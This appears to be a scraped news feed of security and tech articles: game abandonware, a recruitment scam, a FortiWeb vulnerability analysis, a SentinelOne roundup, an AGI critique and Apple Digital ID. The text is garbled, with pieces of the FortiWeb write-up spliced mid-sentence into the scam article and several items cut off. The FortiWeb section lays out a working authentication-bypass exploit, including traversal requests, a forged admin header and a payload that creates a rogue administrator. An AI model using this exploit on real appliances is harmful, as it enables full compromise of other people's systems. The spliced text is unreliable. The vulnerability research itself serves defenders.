Rather than pay the $5.9 million buyout of the contract up front, the team instead made the bonkers decision to negotiate a deferred payment schedule for that amount  over the course of 25 years. The result is that the Mets will be paying Bonilla $1.2 million per year every July 1st, starting in 2011 and ending in 2035. And if you can’t make sense of the math on that one, it’s because you aren’t aware that the Mets ownership was one of Bernie Madoff’s many victims, which is why they had to defer the payments.November 10th is  Bobby Bonilla Day. But it should be named “Let Us Play , You Assholes Day.” The classic spy-shooter turned 25 on that date and, for the exact same reasons we’ve detailed for a god damned decade now, you still can’t buy the game.Here’s the short of it. Due to a series of mergers, closures, and rights purchases, the IP rights for  and its sequel have been potentially split into three pieces between Warner Bros., Activision, and 20th Century Fox, like it was some kind of fucking horcrux. I say potentially because nobody really knows who owns what, if anything, when it comes to these games. When one company, Nightdive Studios, attempted to remaster and re-release the game as they’ve done with other titles, along with securing trademark rights to the game which hasn’t been sold in over a decade, all three companies complained that they may have rights to it and may sue over it.All of those qualifiers are, again, because even these companies themselves don’t know what rights they actually have. And why is that? Well, because the gaming rights deals were inked before digital storage was widely used for this sort of thing and, well, nobody seems to be able to locate the actual paperwork denoting who owns what. Here’s an example of an exchange Nightdive had with Activision.“So we went back to Activision and, [after] numerous correspondence going back and forth, they replied that they thought they might have some rights, but that any records predated digital storage. So we’re talking about a contract in a box someplace.” Kuperman laughed. “The image I get is the end of Indiana Jones… somewhere in a box, maybe in the bowels of Activision, maybe it was shipped off to Iron Mountain or somewhere. And they confessed, they didn’t have [their] hands on it. And they weren’t sure that they even had any of those rights.”Which didn’t keep Activision from warning Nightdive that it  totally sue if it moved forward with remastering the game. The other companies made similar noises.So what’s a person to do if they want to play this game? You can’t buy it legitimately currently. It’s not even for sale anywhere. And a situation like that, which I’ve stated before, completely breaks the copyright bargain. The only option is, as Kotaku of all places notes, to download it for free from somewhere.Downloading games that are available for sale is piracy. It’s illegal, and it’s not supportive of developers and their art. But when companies have gone out of their way to refuse to take your money for a game for the better part of two decades, it’s a very different situation. Look, I’m not your real mom and dad, and I can’t tell you what to do. But if you were to click on this link (link removed by Techdirt due to us not knowing where it takes you) and download both games (as well as spin-off Contract Jack), you’d end up with modernized versions of these classic games, with mods that allow them to work on Windows 10 and 11, and in widescreen. And what better time to do (or not do) this than on the first game’s 25th anniversary?At this point (as indeed it was over eight years ago, the last time I suggested just downloading it, to no negative response at all) we have to consider No One Lives Forever to be abandonware. No one is willing to take ownership of it, although those that could do so sometimes mindlessly threaten to intervene should anyone else try to rebuild it for sale. Nightdive were scared off a decade ago, and it’s been sitting on GOG’s Dreamlist since that launched earlier this year (with 87,171 people saying they’d pay for it if they could). It’s far too small of a concern for any of the megacorps who might own it to spend the time and money to work out if they do, but it’s far too big of a concern within gaming history to be allowed to just disappear. Thank goodness for the anonymous heroes running NOLF Revival. I thank them for their service.It’s the only option the public has to play this game and enjoy this small piece of our collective culture. The real answer here is some sort of copyright reform that makes this situation not a thing. If a company, or group of companies, won’t offer a piece of work for sale, can’t be bothered to understand what they own of it, if anything, and have no plans to figure any of that out… then how can this be copyright infringement?So happy “Let Us Play , You Assholes” Day. Maybe we’ll be able to play this game legitimately by the time Bobby Bonilla stops making his million and change per year.]]></content:encoded></item><item><title>Be careful responding to unexpected job interviews</title><link>https://www.malwarebytes.com/blog/news/2025/11/be-careful-responding-to-unexpected-job-interviews</link><author></author><category>threatintel</category><pubDate>Fri, 14 Nov 2025 16:30:38 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[One of our customers was contacted on LinkedIn about a job offer. The initial message was followed up by an email:“Thank you for your interest in the Senior Construction Manager position at {company}.

I look forward to speaking with you soon.I edited out the company name and the name of the supposed recruiter, but when we Googled that alleged recruiter’s name, he does work at the impersonated company (just not in HR). That’s not unique, though. We’ve heard several variants of very similar stories involving other companies and other names.Other red flags included the fact that the email came from a Gmail address (not a company domain), and that the company has no openings for a Senior Construction Manager.When our target replied they were looking forward to the interview, they received the “Meeting invitation” by email:      {recruiter} INVITED YOU TO A ZOOM REMOTE MEETINGPlease click the button below to view the invitation within 30 days.

It’s associated with LogMeIn Resolve, a remote support tool, which attackers can fake or misuse to execute ransomware payloads once installed.This tactic is part of a broader trend where attackers pose as recruiters or trusted contacts, inviting targets to meetings and requiring them to install software updates to participate.

While many may have dismissed it as Internet junk, it wasn’t - it was evidence of a threat actor looking to exploit a vulnerability (currently unnamed and without ID) that allowed privileged administrative functions to be reached.In the example above, the threat actor exploited the vulnerability to add administrative accounts to the target and vulnerable appliance, serving as a weak persistence mechanism. To be explicitly clear, this is a complete compromise of the vulnerable appliance.The vulnerability itself? As far as we can see, it’s actually two..A Path Traversal vulnerability that we can see within the URIAn Authentication Bypass vulnerability (via the contents of the HTTP request header  )This question has been screamed at us for the last 24 hours.While patch notes for FortiWeb 8.0.2 don’t include a reference or mention of any resolved vulnerabilities, the results from our internal testing labs show that 8.0.2 is mysteriously patched for this mysterious vulnerability:Did Fortinet stumble, silently, into patching a vulnerability? Only Fortinet knows, really.The following versions are known to be affected (thanks to Orange Cyberdefense for sharing information with us):The First Step - The Path TraversalThe first stage of our vulnerability begins with leveraging a path traversal.GET /api/v2.0/cmdb/system/admin/../../../../../cgi-bin/fwbcgi HTTP/1.1
Host: 192.168.9.1
Connection: keep-alive

As you can see, this is fairly ‘simple’ - if the URI begins with a valid FortiWeb API path, an attacker is then able to traverse to another CGI executable.Which CGI executable? Well, there is only one -  - so the choice is fairly simple.The following method can be used to quickly check whether your FortiWeb version is affected by this vulnerability.If the request returns HTTP 200, the vulnerability is present.If the request returns HTTP 403, the vulnerability has been patched.Let’s very briefly explain how the  binary works. For context, the main function provided by  follows this structure:int __fastcall main(int argc, const char **argv, const char **envp)
{
  [..SNIP..]

  cgi_init(v3);
  while ( !access("/var/log/debug_cgi", 0) )
    sleep(1u);
  if ( (unsigned int)cgi_inputcheck((__int64)v4) || (gui_conf_init(), cli_init(), (unsigned int)cgi_auth(v4)) )
  {
    cgi_output(v4);
  }
  else
  {
    cgi_process(v4);
    cgi_output(v4);
    conf_end();
  }
  cgi_free(v4);
  return 0;
}
Our goal is to reach the  function, which contains all the backend functionality we need access to. However, two validation functions stand between us and this objective:Both checks must pass (return 0) for execution to proceed to .Step Two (a) - cgi_inputcheck()In reality,  is very simple.The  routine is designed to perform a very lightweight validation of the incoming HTTP body. In practice, its role is limited to confirming that the content is a valid JSON blob.The relevant portion of the function looks like this:__int64 __fastcall cgi_inputcheck(__int64 a1)
{
  [..SNIP..]
  
  v1 = (char *)cat_cgi_paths();
  snprintf(s, 0x100uLL, "%s%s%s", "/var/log/inputcheck/", v1, ".json");
  free(v1);
  v2 = fopen(s, "r");
  if ( !v2 )
    return 0LL;  // File doesn't exist - check passes
    
  [..SNIP..]
  
  v10 = json_tokener_parse((__int64)v8);
  if ( !v10 )
  {
    // JSON parsing failed - check fails
    return 0LL;
  }
  [..SNIP..]
}
The logic here is remarkably permissive:If the associated  file does  exist (the default case), the function immediately returns  - validation passed.If the file  exist, the only requirement is that the body can be parsed as valid JSON.As a result, any valid JSON object satisfies this check, including the simplest possible JSON payload:Step Two (b) - Impersonating Users Via This is where things become significantly more interesting.While you might expect  to authenticate the caller, that is  what it does. Instead, the function effectively provides a mechanism to  based on data supplied by the client. The behaviour unfolds in several steps:At , the function extracts a  header from the HTTP request.At , the value is Base64-decoded.At , the result is parsed as JSON.At , the function iterates through all JSON keys and extracts several user-related attributes: > target username > login identifierThese fields are used to tell  which user the HTTP request sender wishes to impersonate.Notably, the built-in  account on FortiWeb appliances has a consistent set of attributes across devices - and these attributes cannot be modified.The relevant portion of the function looks like this:__int64 __fastcall cgi_auth(_QWORD *a1)
{
  [..SNIP..]
  
  v2 = getenv("HTTP_CGIINFO");
  if ( !v2 )
  {
    message("%s:%d: not include cgi info header\\n", s);
    return 0xFFFFFFFFLL;
  }
  
  // Decode base64 HTTP_CGIINFO header
  cmDecodeB64(v19, 512LL, v2, 0xFFFFFFFFLL); // [2]
  v3 = json_tokener_parse(v19); // [3]
  
  [..SNIP..]
  
  // Extract user attributes from the decoded JSON
  // [4]
  for ( i = *(_QWORD *)(json_object_get_object(v3) + 8); i; i = *(_QWORD *)(i + 24) )
  {
    v5 = *(const char **)i;
    string = (const char *)json_object_get_string(*(_QWORD *)(i + 16));
    
    if ( !strncmp(v5, "username", 8uLL) )
      a1[682] = strdup(string);
    else if ( !strncmp(v5, "profname", 8uLL) )
      a1[683] = strdup(string);
    else if ( !strncmp(v5, "vdom", 4uLL) )
      a1[684] = strdup(string);
    else if ( !strncmp(v5, "loginname", 9uLL) )
      a1[685] = strdup(string);
    // ... additional fields
  }
  
  // Set login context with extracted credentials
  
  // [5]
  set_login_context_vsa(a1[685], a1[682], v19, a1[683], v8, 0LL);
  domain_id = cmf_shm_find_domain_id((void *)a1[684]);
  cmf_set_cur_domain_id(domain_id);
  
  return 0LL;
}
Once all fields are extracted, the call at  -  - applies the impersonation context.From this point onward, all actions executed within  are performed as the impersonated user.In other words - by supplying a handcrafted  header, an attacker can impersonate any user, including the built-in admin, and inherit their full privileges.Exploiting The VulnerabilityWith both validation checks out of the way, exploitation becomes remarkably straightforward. To assume administrative privileges, we can follow the following flow:Create a JSON object with built-in  credentials:{
  "username": "admin",
  "profname": "super_admin",

Auth. Bypass)

The Internet is ablaze, and once again we all have a front-row seat - a bad person, if you can believe it, is doing a bad thing!

The first warning of such behaviour came from the great team at Defused:

As many are now aware, an unnamed (and potentially silently fixed) vulnerability affecting a number of Forti-devices (blast radius is currently unclear) is being actively exploited. For many, this will feel like a normal Tuesday.

For others, it will feel like a Monday.

Moments like this are why we exist. As soon as we identified the activity, the watchTowr team moved quickly, spinning up our rapid reaction process to support clients as the threat emerged.

### The Vulnerability

Fortinet system administrators staring inquisitively at packet captures (as you generally have to do as an administrator of any security appliance), may have seen the following request stream pass them in the past weeks:

```
POST /api/v2.0/cmd/system/admin%3F/../.. ../../../cgi-bin/fwbcgi HTTP/1.1 Host: [redacted] User-Agent: python-urllib3/2.2.3 Accept-Encoding: identity CGIINFO: eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJwcm9mbmFtZSI6ICJwcm9mX2FkbWluIiwgInZkb201OiAicm9vdCIsICJsb2dpbm5hbWUiOiAiYWRtaW4ifQ== Content-Length: 835 Content-Type: application/json { "data": { "q_type": 1, "name": "Testpoint", "access-profile": "prof_admin", "access-profile_val": "0", "trusthostv4": "0.0.0.0/0 ", "trusthostv6": "::/0 ", "last-name": "", "first-name": "", "email-address": "", "phone-number": "", "mobile-number": "", "hidden": 0, "domains": "root", "sz_dashboard": -1, "type": "local-user", "type_val": "0", "admin-usergrp_val": "0", "wildcard_val": "0", "accprofile-override_val": "0", "sshkey": "", "passwd-set-time": 0, "history-password-pos": 0, "history-password0": "", "history-password1": "", "history-password2": "", "history-password3": "", "history-password4": "", "history-password5": "", "history-password6": "", "history-password7": "", "history-password8": "", "history-password9": "", "force-password-change": "disable", "force-password-change_val": "0", "password": "AFodIUU3Sszp5" }}
```

While many may have dismissed it as Internet junk, it wasn’t - it was evidence of a threat actor looking to exploit a vulnerability (currently unnamed and without ID) that allowed privileged administrative functions to be reached.

In the example above, the threat actor exploited the vulnerability to add administrative accounts to the target and vulnerable appliance, serving as a weak persistence mechanism.

To be explicitly clear, this is a complete compromise of the vulnerable appliance.

The vulnerability itself? As far as we can see, it’s actually two..

- A Path Traversal vulnerability that we can see within the URI
- An Authentication Bypass vulnerability (via the contents of the HTTP request header `CGIINFO`)

### Is Fortinet Aware?

This question has been screamed at us for the last 24 hours.

While patch notes for FortiWeb 8.0.2 don’t include a reference or mention of any resolved vulnerabilities, the results from our internal testing labs show that 8.0.2 is mysteriously patched for this mysterious vulnerability:

Did Fortinet stumble, silently, into patching a vulnerability? Only Fortinet knows, really.

The following versions are known to be affected (thanks to Orange Cyberdefence for sharing some of these versions with us):

- 8.0: <8.0.2
- 7.6: <7.6.5
- 7.4: <7.4.10
- 7.2: <7.2.12
- 7.0: <7.0.12
- 6.4: <= 6.4.3
- 6.3: <= 6.3.23

### The First Step - The Path Traversal

The first stage of our vulnerability begins with leveraging a path traversal.

```
GET /api/v2.0/cmdb/system/admin/../../../../../cgi-bin/fwbcgi HTTP/1.1 Host: 192.168.9.1 Connection: keep-alive
```

As you can see, this is fairly ‘simple’ - if the URI begins with a valid FortiWeb API path, an attacker is then able to traverse to another CGI executable. followed by a path-traversal sequence attempting to reach another CGI executable.

Which CGI executable? Well, there is only one - `fwbcgi` \- so the choice is fairly simple.

The following method can be used to quickly check whether your FortiWeb version is affected by this vulnerability.

- If the request returns HTTP 200, the vulnerability is present.
- If the request returns HTTP 403, the vulnerability has been patched.

### Step Two - FWBCGI

Let’s very briefly explain how the `fwbcgi` binary works. For context, the main function provided by `fwbcgi` follows this structure:

```
int __fastcall main(int argc, const char **argv, const char **envp) { [..SNIP..] cgi_init(v3); while ( !access("/var/log/debug_cgi", 0) ) sleep(1u); if ( (unsigned int)cgi_inputcheck((__int64)v4) || (gui_conf_init(), cli_init(), (unsigned int)cgi_auth(v4)) ) { cgi_output(v4); } else { cgi_process(v4); cgi_output(v4); conf_end(); } cgi_free(v4); return 0; }
```

Our goal is to reach the `cgi_process()` function, which contains all the backend functionality we need access to. However, two validation functions stand between us and this objective:

1. `cgi_inputcheck()`
2. `cgi_auth()`

Both checks must pass (return 0) for execution to proceed to `cgi_process()`.

### Step Two (a) - cgi\_inputcheck()

In reality, `cgi_inputcheck()` is very simple.

The `cgi_inputcheck()` routine is designed to perform a very lightweight validation of the incoming HTTP body. In practice, its role is limited to confirming that the content is a valid JSON blob.

The relevant portion of the function looks like this:

```
__int64 __fastcall cgi_inputcheck(__int64 a1) { [..SNIP..] v1 = (char *)cat_cgi_paths(); snprintf(s, 0x100uLL, "%s%s%s", "/var/log/inputcheck/", v1, ".json"); free(v1); v2 = fopen(s, "r"); if ( !v2 ) return 0LL; // File doesn't exist - check passes [..SNIP..] v10 = json_tokener_parse((__int64)v8); if ( !v10 ) { // JSON parsing failed - check fails return 0LL; } [..SNIP..] }
```

The logic here is remarkably permissive:

- If the associated `inputcheck` file does **not** exist (the default case), the function immediately returns `0`\- validation passed.
- If the file **does** exist, the only requirement is that the body can be parsed as valid JSON.

As a result, any valid JSON object satisfies this check, including the simplest possible JSON payload:

```
{}
```

Let’s move on…

### Step Two (b) - Impersonating Users Via `cgi_auth()`

This is where things become significantly more interesting.

While you might expect `cgi_auth()` to authenticate the caller, that is _not_ what it does. Instead, the function effectively provides a mechanism to **impersonate any user** based on data supplied by the client. The behaviour unfolds in several steps:

1. At **\[1\]**, the function extracts a `CGIINFO` header from the HTTP request.
2. At **\[2\]**, the value is Base64-decoded.
3. At **\[3\]**, the result is parsed as JSON.
4. At **\[4\]**, the function iterates through all JSON keys and extracts several user-related attributes:
   - `username` \> target username
   - `profname` \> profile name
   - `vdom` \> virtual domain
   - `loginname` \> login identifier

These fields are used to tell `fwbcgi` which user the HTTP request sender wishes to impersonate.

Notably, the built-in `admin` account on FortiWeb appliances has a consistent set of attributes across devices - and these attributes cannot be modified.

The relevant portion of the function looks like this:

```
__int64 __fastcall cgi_auth(_QWORD *a1) { [..SNIP..] v2 = getenv("HTTP_CGIINFO"); if ( !v2 ) { message("%s:%d: not include cgi info header\\n", s); return 0xFFFFFFFFLL; } // Decode base64 HTTP_CGIINFO header cmDecodeB64(v19, 512LL, v2, 0xFFFFFFFFLL); // [2] v3 = json_tokener_parse(v19); // [3] [..SNIP..] // Extract user attributes from the decoded JSON // [4] for ( i = *(_QWORD *)(json_object_get_object(v3) + 8); i; i = *(_QWORD *)(i + 24) ) { v5 = *(const char **)i; string = (const char *)json_object_get_string(*(_QWORD *)(i + 16)); if ( !strncmp(v5, "username", 8uLL) ) a1[682] = strdup(string); else if ( !strncmp(v5, "profname", 8uLL) ) a1[683] = strdup(string); else if ( !strncmp(v5, "vdom", 4uLL) ) a1[684] = strdup(string); else if ( !strncmp(v5, "loginname", 9uLL) ) a1[685] = strdup(string); // ... additional fields } // Set login context with extracted credentials // [5] set_login_context_vsa(a1[685], a1[682], v19, a1[683], v8, 0LL); domain_id = cmf_shm_find_domain_id((void *)a1[684]); cmf_set_cur_domain_id(domain_id); return 0LL; }
```

Once all fields are extracted, the call at **\[5\]** \- `set_login_context_vsa()` \- applies the impersonation context.

From this point onward, all actions executed within `cgi_process()` are performed as the impersonated user.

In other words - by supplying a handcrafted `HTTP_CGIINFO` header, an attacker can impersonate any user, including the built-in admin, and inherit their full privileges.

Beautiful.

### Exploiting the Vulnerability

With both validation checks out of the way, exploitation becomes remarkably straightforward. To assume administrative privileges, we can follow the following flow:

1. Create a JSON object with built-in `admin` credentials:

```
{ "username": "admin", "profname": "super_admin", "vdom": "root", "loginname": "admin" }
```

1. Base64-encode this JSON
2. Send it in the `HTTP_CGIINFO` header

Once processed by `cgi_auth()`, the vulnerable appliance will happily impersonate the supplied user and treat the request as authenticated with full administrative rights.

From this point on, all execution flows into `cgi_process()`, which is the heart of the backend logic. That means an attacker can perform any privileged action simply by supplying the appropriate JSON structure.

For example, the following payload instructs the appliance to create a new local user named `watchTowr` with the password `watchTowr` and administrative privileges ( `prof_admin`):

```
{"data":{"name":"watchTowr","access-profile":"prof_admin","access-profile_val":"0","trusthostv4":"0.0.0.0/0","trusthostv6":"::/0","last-name":"","first-name":"","email-address":"","phone-number":"","mobile-number":"","hidden":0,"comments":"","sz_dashboard":-1,"type":"local-user","type_val":"0","admin-usergrp_val":"0","wildcard_val":"0","accprofile-override_val":"0","sshkey":"","passwd-set-time":0,"history-password-pos":0,"history-password0":"","history-password1":"","history-password2":"","history-password3":"","history-password4":"","history-password5":"","history-password6":"","history-password7":"","history-password8":"","history-password9":"","force-password-change":"disable","force-password-change_val":"0","password":"watchTowr"}}
```

They’re calling it “Window AI.”Details are still scarce. Based on Mozilla’s official announcement on Thursday (13), it looks like a deeper implementation than the existing sidebar that gives access to third‑party chatbots (ChatGPT, Gemini, Copilot, etc.). The post stresses the feature will be opt-in and that the user “is in control.”There’s a waitlist to try the feature and a Mozilla forum thread inviting people to “help shape” the initiative.It’s safe to say that the people who volunteered to “shape” the initiative want it dead and buried. Of the 52 responses at the time of writing, *all* rejected the idea and asked Mozilla to stop shoving AI features into Firefox.I don’t know whether the negative reactions reflect the majority of Firefox users or are just a noisy minority. Mozilla, after all, likely has a clearer view of the whole user base.What strikes me as odd is the decision to position itself as just another AI‑enabled web browser, picking a fight with big techs and better‑funded startups whose users are less hostile (and sometimes enthusiastic) about adding AI to web browsing.Mozilla seems to be trying to wedge itself between those who reject AI and those who want generative‑AI features in the browser — trying to please everyone — as this excerpt from the post shows:We see a lot of promise in AI browser features making your online experience smoother, more helpful, and free from the everyday disruptions that break your flow. But browsers made by AI companies ask you to make a hard choice — either use AI all the time or don’t use it at all.We’re focused on making the best browser, which means recognizing that everyone has different needs. For some, AI is part of everyday life. For others, it’s useful only occasionally. And many are simply curious about what it can offer, but unsure where to start.Regardless of your choice, with Firefox, you’re in control.]]></content:encoded></item><item><title>The Good, the Bad and the Ugly in Cybersecurity – Week 46</title><link>https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-46-7/</link><author></author><category>security</category><pubDate>Fri, 14 Nov 2025 14:00:09 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[

Using aliases like “chubaka.kor” and “nets”, Volkov sold access to the ransomware group after breaching his victim’s corporate networks and demanding ransoms from $300,000 to $15 million in Bitcoin. FBI investigators traced Volkov through iCloud, cryptocurrency records, and social media, recovering chat logs, stolen credentials, and evidence of ransom negotiations, which all linked him to $1.5 million in collected payments.His breaches affected companies across multiple states, including banks, engineering firms, and telecoms. Volkov faces up to 53 years in prison and over $9.1 million in restitution for charges including trafficking in access, identity theft, computer fraud, and money laundering., an international effort against cybercrime. Coordinated by Europol and Eurojust with support from private partners, the action consisted of searches at 11 locations in Germany, Greece, and the Netherlands, where officers seized 20 domains and arrested a key VenomRAT suspect. The disrupted infrastructure involved hundreds of thousands of infected devices and millions of stolen credentials, including access to over 100,000 crypto wallets. Rhadamanthys, active since 2023, had seen rapid growth in late 2025, affecting thousands of IP addresses daily.Authorities recommend checking systems for infection via politie.nl/checkyourhack and haveibeenpwned.com. Operation Endgame has previously disrupted numerous malware and ransomware networks, including Bumblebee, IcedID, Pikabot, Smokeloader, SystemBC, and Trickbot, highlighting ongoing international efforts to curb cybercrime.The Bad | UNC6485 Exploits Triofox Vulnerability for Remote Code ExecutionThreat actors have . The vulnerability, tracked as CVE-2025-12480, allows attackers to abuse an access control logic error that grants admin privileges when the request host equals ‘localhost’. By spoofing this value in the HTTP host header, an attacker can reach sensitive setup pages without credentials, especially on systems where the  parameter was never configured.Security researchers first discovered an intrusion in August targeting a Triofox instance running version 16.4.10317.56372. They later determined that the threat cluster UNC6485 used a malicious HTTP GET request containing a localhost header to access the  setup page. Using this workflow, the attackers created a rogue administrator account called ‘Cluster Admin’, uploaded a malicious script, and configured Triofox to treat that script as the antivirus scanner path. .The payload then launches a PowerShell downloader to retrieve a Zoho UEMS installer, which subsequently deploys Zoho Assist and AnyDesk on the compromised host for remote access and lateral movement. The attackers were also observed using Plink and PuTTY to establish SSH tunnels and forward traffic to the compromised host’s RDP port.Gladinet has since fixed CVE-2025-12480 in Triofox version 16.7.10368.56560, and administrators are urged to update to the latest release (16.10.10408.56683), review admin accounts, and ensure the antivirus engine is not configured to run unauthorized binaries.The Ugly | Attackers Exploit Zero-Day to Steal Washington Post Employee DataThe Washington Post, one of the vendors impacted by a breach targeting Oracle software,  in the data theft campaign. The Post, one of the largest U.S. newspapers with 2.5 million digital subscribers, confirmed that attackers accessed parts of its network between July 10 and August 22 by exploiting a previously unknown zero-day vulnerability in Oracle E-Business Suite, the organization’s internal enterprise resource planning (ERP) system. The vulnerability is tracked as CVE-2025-61884.According to the letter sent to affected individuals, the Post learned of the intrusion after a threat actor contacted the company on September 29 claiming access to its Oracle applications. Post-breach investigations identified the widespread flaw that allowed the attackers to access many Oracle customers’ applications. The attackers used this flaw to steal sensitive data and later attempted to extort the Post and other organizations breached in the same campaign.Although the Post did not name the group responsible, The Post’s investigation has determined that data belonging to 9,720 individuals was compromised.

They really do think someone, perhaps them, will build AGI, and that it will lead to either the flourishing or destruction of humanity.Elon Musk founded OpenAI because he thought Demis Hassabis was an evil genius who would build AGI first:…Musk would regularly characterise Hassabis as a supervillain who needed to be stopped. Musk would make unequivocally clear that OpenAI was the good to DeepMind’s evil. … “He literally made a video game where an evil genius tries to create AI to take over the world,” Musk shouted [at an OpenAI off-site], referring to Hassabis’s 2004 title , “and fucking people don’t see it. Fucking people don’t see it! And Larry [Page]? Larry thinks he controls Demis but he’s too busy fucking windsurfing to realize that Demis is gathering the power.”OpenAI’s co-founder and chief scientist Ilya Sutskever regularly told audiences and employees to “feel the AGI”. At a company off-site in Yosemite in September 2022, employees gathered around a firepit:In the pit, [Sutskever] had placed a wooden effigy that he’d commissioned from a local artist, and began a dramatic performance. This effigy, he explained represented a good, aligned AGI that OpenAI had built, only to discover it was actually lying and deceitful. OpenAI’s duty, he said, was to destroy it. … Sutskever doused the effigy in lighter fluid and lit on fire.I think it’s remarkable that what was until recently sci-fi fantasy has become a mainstream view in Silicon Valley.Hao writes that GPT-2 was a bet on the “pure language” hypothesis, that asserts that since we communicate through language, then AGI should emerge from training a model solely on language. This is contrast to the “grounding” hypothesis, that asserts an AGI needs to perceive the world. Successfully scaling GPT to GPT-2 convinced enough people at OpenAI that the pure language hypothesis was valid. They just needed more data, more model parameters, and more compute.And this is all fine, because they’re going to make AGI and the expected value (EV) of it will be huge! (Briefly, the argument goes that if there is a 0.001% chance of AGI delivering an extremely large amount of value, and 99.999% chance of much less or zero value, then the EV is still extremely large because (0.001% * very_large_value) + (99.999% * small_value) = very_large_value).But AGI arguments based on EV are nonsensical because the values and probabilities are made up and unfalsifiable. They also ignore externalities like environmental damage, which in contrast to AGI, have known negative value and certain probability: costs borne by everyone else right now.As a technologist I want to solve problems effectively (by bringing about the desired, correct result), efficiently (with minimal waste) and without harm (to people or the environment).LLMs-as-AGI fail on all three fronts. The computational profligacy of LLMs-as-AGI is dissatisfying, and the exploitation of data workers and the environment unacceptable. Instead, if we drop the AGI fantasy, we can evaluate LLMs and other generative models as solutions for specific problems, rather than  problems, with proper cost benefit analysis. For example, by using smaller purpose-built generative models, or even discriminative (non-generative) models. In other words, make trade-offs and actually do engineering.]]></content:encoded></item><item><title>Google: Hoeveelheid memory safety-kwetsbaarheden met een factor duizend gedaald door omarming Rust</title><link>https://www.security.nl/posting/912828/Google%3A+Hoeveelheid+memory+safety-kwetsbaarheden+met+een+factor+duizend+gedaald+door+omarming+Rust?channel=rss</link><author></author><category>security</category><pubDate>Fri, 14 Nov 2025 13:10:00 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[

For now, it works only for identity verification at Transportation Security Administration (TSA) checkpoints in more than 250 airports.Apple says the reason for the introduction is because users asked for it:“Since introducing the ability to add a driver’s license or state ID to Apple Wallet in 2022, we’ve seen how much users love having their ID right on their devices. Digital IDs brings this secure and convenient option to even more users across the country, as they can now add an ID to Wallet using information from their U.S. passport.”What does Apple’s Digital ID mean for users?You add a Digital ID by scanning your physical passport (photo page and chip) and taking a selfie as part of a verification process. Your ID stays encrypted on the device and isn’t shared with Apple.To present it, you hold your iPhone or Apple Watch near a reader and confirm with Face ID or Touch ID. You choose which information is shared, and you never have to unlock or hand over your device.At launch, it’s TSA-only. Apple says wider use at businesses, organizations, and online services will come later. Digital ID  replace a passport for international travel.Pros of Apple’s Digital ID:Quickly present your ID from your iPhone or Apple Watch for TSA security, and eventually, for businesses or online checks.The ID data is locally encrypted and requires biometric authentication for access. Users review and authorize the information shared, and Apple claims it doesn’t track when you use the ID.It’s helpful for people without a REAL ID-compliant driver’s license who want to fly domestically.You don’t hand over your device for inspection. You just present your phone or watch to a reader.Apple already has the support of states and airports, and plans to expand.The risks of using Apple’s Digital IDWe had to look at other sources to find some of the more serious downsides.Lose your phone or watch, and you lose access to your Digital ID. That’s not to mention the risks if the device is stolen.Privacy and surveillance: Experts warn Digital ID adoption may lead to more ID checks in places that didn’t require them before, increasing surveillance and data tracking concerns.​Potential for security breaches: Encrypted or not, digital IDs can still be targeted by device exploits, phishing, or social engineering.Face ID or Touch ID can, in some cases, be spoofed or exploited.​Apple’s system is closed, which means users are dependent on Apple’s legacy, update policies, and device ecosystem. If you switch platforms, you might find it hard to recover your digital ID. Critics worry police or other authorities could pressure users to unlock devices under the guise of ID verification.Data sharing with state authorities: Your photo, video, and limited device analytics may be shared temporarily with issuing authorities for verification.​Digital ID doesn’t replace your passport outside the US, so it’s not very useful for international travel, and it’s not accepted everywhere yet.Apple’s Digital ID aims to make ID checks private, more secure, and convenient for most users. But concerns remain regarding privacy, device loss, ecosystem lock-in, and the potential for expanded surveillance and demands in everyday activities beyond TSA checkpoints.We still see this option as safer than storing your ID in a browser, where attacks are far more common, but the drawbacks may still outweigh the benefits for many users. As one of our readers put it: “The inconvenience of having to look through a drawer for my passport is not that big, that I would risk having my identity stolen.”We don’t just report on threats – we help safeguard your entire digital identityCybersecurity risks should never spread beyond a headline. Protect your—and your family’s—personal information by using identity protection.]]></content:encoded></item><item><title>The Role of Humans in an AI-Powered World</title><link>https://www.schneier.com/blog/archives/2025/11/the-role-of-humans-in-an-ai-powered-world.html</link><author>Bruce Schneier</author><category>security</category><pubDate>Fri, 14 Nov 2025 12:00:33 +0000</pubDate><source url="https://www.schneier.com/">Schneier on Security</source><content:encoded><![CDATA[As AI capabilities grow, we must delineate the roles that should remain exclusively human. The line seems to be between fact-based decisions and judgment-based decisions.For example, in a medical context, if an AI was demonstrably better at reading a test result and diagnosing cancer than a human, you would take the AI in a second. You want the more accurate tool. But justice is harder because justice is inherently a human quality in a way that “Is this tumor cancerous?” is not. That’s a fact-based question. “What’s the right thing to do here?” is a human-based question.Chess provides a useful analogy for this evolution. For most of history, humans were best. Then, in the 1990s, Deep Blue beat the best human. For a while after that, a good human paired with a good computer could beat either one alone. But a few years ago, that changed again, and now the best computer simply wins. There will be an intermediate period for many applications where the human-AI combination is optimal, but eventually, for fact-based tasks, the best AI will likely surpass both.The enduring role for humans lies in making judgments, especially when values come into conflict. What is the proper immigration policy? There is no single “right” answer; it’s a matter of feelings, values, and what we as a society hold dear. A lot of societal governance is about resolving conflicts between people’s rights—my right to play my music versus your right to have quiet. There’s no factual answer there. We can imagine machines will help; perhaps once we humans figure out the rules, the machines can do the implementing and kick the hard cases back to us. But the fundamental value judgments will likely remain our domain.This essay originally appeared in IVY.]]></content:encoded></item><item><title>Google backpedals on new Android developer registration rules</title><link>https://www.bleepingcomputer.com/news/google/google-backpedals-on-new-android-developer-registration-rules/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Fri, 14 Nov 2025 11:54:44 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Google is backpedaling on its decision to introduce new identity verification rules for all developers, stating that it will also introduce accounts for limited app distribution and will allow users to install apps from unverified devs. [...]]]></content:encoded></item><item><title>Multiple vulnerabilities in Cisco Unified CCX Allow Attackers to Execute Arbitrary Commands</title><link>https://cybersecuritynews.com/cisco-unified-ccx-vulnerability/</link><author></author><category>security</category><pubDate>Fri, 14 Nov 2025 11:38:48 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[Multiple vulnerabilities in Cisco Unified CCX Allow Attackers to Execute Arbitrary Commands

